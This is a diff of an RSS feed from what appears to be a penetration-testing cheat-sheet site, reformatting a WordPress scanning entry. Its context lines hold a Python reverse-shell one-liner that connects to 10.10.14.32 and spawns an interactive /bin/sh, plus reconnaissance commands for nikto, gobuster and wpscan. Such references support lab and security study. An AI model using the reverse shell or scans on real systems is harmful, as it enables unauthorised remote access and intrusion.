@@ -39,7 +39,8 @@ Python in a file :
 import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.32&amp;#34;,1235)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;])</description></item><item><title>Website scanning</title><link>/scanning/website-scanning/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/scanning/website-scanning/</guid><description>Nikto Classic scan nikto -h $site
 Gobuster Classic scan gobuster dir -u $site -w &amp;quot;/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt&amp;quot; -t 20 -o scans/gobuster
 VHOST scan gobuster vhost -u $site -w &amp;quot;/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt&amp;quot; -t 20 -o scans/gobuster_vhost
-``
-Wordpress Classic Wordpress scan Quick scan : wpscan --url $site
-Aggressive scan In order to enumerate all plugins : wpscan --url $site --plugins-detection aggressive
+Wordpress Classic Wordpress scan Quick scan :
+wpscan --url $site
+Aggressive scan In order to enumerate all plugins :
+wpscan --url $site --plugins-detection aggressive
 With token wpscan --url $site --api-token $token</description></item></channel></rss>
